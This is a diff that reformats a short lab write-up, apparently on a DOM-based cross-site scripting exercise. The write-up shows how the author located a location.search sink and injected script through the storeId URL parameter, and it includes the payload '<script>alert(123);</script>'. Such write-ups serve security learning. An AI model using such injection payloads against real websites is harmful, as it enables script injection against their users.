@@ -14,10 +14,9 @@ date: 2023-04-25
 
 ## Recon
 1. Find the injection place
-I used string search to find `location.search` in each sub-page source.
-Here is the interesting code:
-    :::spoiler Source Code
-    ```javascript!
+    I used string search to find `location.search` in each sub-page source.
+    Here is the interesting code:
+    ```javascript
     ...
     <script>
         var stores = ["London","Paris","Milan"];
@@ -36,17 +35,14 @@ Here is the interesting code:
     </script>
     ...
     ```
-    :::
 2. Try type something about `storeID` as URL GET parameter
-Payload: `/product?productId=1&storeId=abc`
-![](https://i.imgur.com/KKbTF8f.png)
-You can see that this is a perfect injection place
+    
+    Payload: `/product?productId=1&storeId=abc`
+    ![](https://i.imgur.com/KKbTF8f.png)
+    You can see that this is a perfect injection place
 
 
 ## Exp
 Payload: `/product?productId=1&storeId=<script>alert(123);</script>`
-:::spoiler Success Screenshot
-![](https://i.imgur.com/bjEoUzh.png)
-:::
 
-## Reference
+![](https://i.imgur.com/bjEoUzh.png)
